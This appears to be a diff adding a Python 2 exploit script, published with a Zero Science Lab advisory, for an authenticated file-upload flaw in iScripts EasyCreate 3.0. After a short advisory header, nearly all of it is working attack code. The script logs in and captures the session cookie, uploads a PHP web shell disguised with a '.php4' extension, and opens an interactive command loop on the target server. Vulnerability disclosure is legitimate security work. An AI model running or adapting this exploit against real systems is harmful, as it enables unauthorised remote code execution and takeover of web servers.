@@ -1,0 +1,217 @@
+#!C:/Python27/python.exe -u
+#
+#
+# iScripts EasyCreate 3.0 Remote Code Execution Exploit
+#
+#
+# Vendor: iScripts.com
+# Product web page: http://www.iscripts.com
+# Affected version: 3.0
+#
+# Summary: iScripts EasyCreate is a private label online website builder. This 
+# software allows you to start an online business by offering website building 
+# services to your customers. Equipped with drag and drop design functionality, 
+# crisp templates and social sharing capabilities, this online website builder 
+# software will allow you to provide the best website building features to your 
+# users.
+#
+# Desc: iScripts EasyCreate suffers from an authenticated arbitrary PHP code
+# execution. The vulnerability is caused due to the improper verification of 
+# uploaded files in '/ajax_image_upload.php' script thru the 'userImages' POST 
+# parameter. This can be exploited to execute arbitrary PHP code by uploading 
+# a malicious PHP script file with '.php4' extension (to bypass the '.htaccess'
+# block rule) that will be stored in '/uploads/siteimages/thumb/' directory.
+#
+# Tested on: Apache
+#			 MySQL 5.5.40
+#
+# Vulnerability discovered by Bikramaditya 'PhoenixX' Guha
+#
+# Zero Science Lab - http://www.zeroscience.mk
+# Macedonian Information Security Research And Development Laboratory
+#
+#
+# Advisory ID: ZSL-2016-5297
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5297.php
+#
+#
+# 17.11.2015
+#
+#
+
+version = '3.0'
+
+import itertools, mimetools, mimetypes
+import cookielib, urllib, urllib2, sys
+import logging, os, time, datetime, re
+import requests, httplib
+
+from colorama import Fore, Back, Style, init
+from cStringIO import StringIO
+from urllib2 import URLError
+
+global file
+file = 'abcde2'
+
+init()
+
+if os.name == 'posix': os.system('clear')
+if os.name == 'nt': os.system('cls')
+piton = os.path.basename(sys.argv[0])
+
+def bannerche():
+    print '''
+ @-------------------------------------------------------------@
+ |    iScripts EasyCreate 3.0 Remote Code Execution Exploit    |
+ |                      ID: ZSL-2016-5297                      |
+ |             Copyleft (c) 2016, Zero Science Lab             |
+ @-------------------------------------------------------------@
+          '''
+    if len(sys.argv) < 1:
+        print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: '+Fore.RESET+piton+' <hostname>\n'
+        print '\x20\x20[*] '+Fore.CYAN+'Example: '+Fore.RESET+piton+' zeroscience.mk\n'
+        sys.exit()
+
+bannerche()
+
+print '\n\x20\x20[*] Initialising exploit '+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET
+
+host = sys.argv[1]
+
+cj = cookielib.CookieJar()
+opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+
+print '\x20\x20[*] Checking host and path '+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
+
+opener2.open('http://'+host+'/easycreate/demo/login.php')
+
+print '\x20\x20[*] Login please.'
+
+username = raw_input('\x20\x20[*] Enter username: ')
+password = raw_input('\x20\x20[*] Enter password: ')
+
+login_data = urllib.urlencode({
+                            'vuser_login' : username,
+                            'vuser_password' : password,                            
+                            })
+
+login = opener2.open('http://'+host+'/easycreate/demo/login.php?act=post', login_data)
+auth = login.read()
+
+if re.search(r'Invalid username and', auth):
+    print '\x20\x20[*] Incorrect username or password '+'.'*24+Fore.RED+'[ER]'+Fore.RESET
+    print
+    sys.exit()
+else:
+    print '\x20\x20[*] Authenticated '+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET
+	
+response = opener2.open('http://'+host+'/easycreate/demo/usermain.php?succ=msg')
+output = response.read()
+
+for session in cj:
+    sessid = session.name
+
+print '\x20\x20[*] Mapping session ID '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
+ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
+cookie = ses_chk.group(0)
+print '\x20\x20[*] Cookie: '+Fore.YELLOW+cookie+Fore.RESET
+
+class MultiPartForm(object):
+
+    def __init__(self):
+        self.form_fields = []
+        self.files = []
+        self.boundary = mimetools.choose_boundary()
+        return
+    
+    def get_content_type(self):
+        return 'multipart/form-data; boundary=%s' % self.boundary
+
+    def add_field(self, name, value):
+        self.form_fields.append((name, value))
+        return
+
+    def add_file(self, field_name, filename, fileHandle, mimetype=None):
+        body = fileHandle.read()
+        if mimetype is None:
+            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
+        self.files.append((field_name, filename, mimetype, body))
+        return
+    
+    def __str__(self):
+
+        parts = []
+        part_boundary = '--' + self.boundary
+        
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: form-data; name="%s"; filename="%s"' % \
+                 (field_name, filename),
+              'Content-Type: application/x-msdownload',
+              '',
+              body,
+            ]
+            for field_name, filename, content_type, body in self.files
+            )
+            
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: form-data; name="%s"' % name,
+              '',
+              value,
+            ]
+            for name, value in self.form_fields
+            )
+        
+        flattened = list(itertools.chain(*parts))
+        flattened.append('--' + self.boundary + '--')
+        flattened.append('')
+        return '\r\n'.join(flattened)
+
+if __name__ == '__main__':
+    
+    form = MultiPartForm()
+    form.add_file('userImages', 'abcde2.php4', 
+                  fileHandle=StringIO('<?php system(\$_GET[\\\'cmd\\\']); ?>'))
+
+
+    request = urllib2.Request('http://'+host+'/easycreate/demo/ajax_image_upload.php')
+    request.add_header('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0')
+    request.add_header('Referer', 'http://'+host+'/easycreate/demo/gallerymanager.php')
+    request.add_header('Accept-Language', 'en-US,en;q=0.5')
+    body = str(form)
+    request.add_header('Content-type', form.get_content_type())
+    request.add_header('Connection', 'keep-alive')
+    request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
+    request.add_header('Accept-Encoding', 'gzip, deflate')
+    request.add_header('Cookie', cookie)
+    request.add_header('Content-length', len(body))
+    request.add_data(body)
+    request.get_data()
+    urllib2.urlopen(request).read()
+    print '\x20\x20[*] Sending payload '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
+
+response = opener2.open('http://'+host+'/easycreate/demo/gallerymanager.php')
+output = response.read()
+
+for line in output.splitlines():
+    if file in line:
+            filename = str(line.split("=")[2:])[3:84]
+            print filename
+
+print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n'+Style.RESET_ALL+Fore.RESET
+raw_input()
+while True:
+    try:
+        cmd = raw_input(Fore.RED+'shell@'+host+':~# '+Fore.RESET)
+        execute = opener2.open(filename+'cmd='+cmd)
+        reverse = execute.read()
+        print reverse
+        
+        if cmd.strip() == 'exit':
+            break
+
+    except Exception:
+        break
+
+sys.exit()
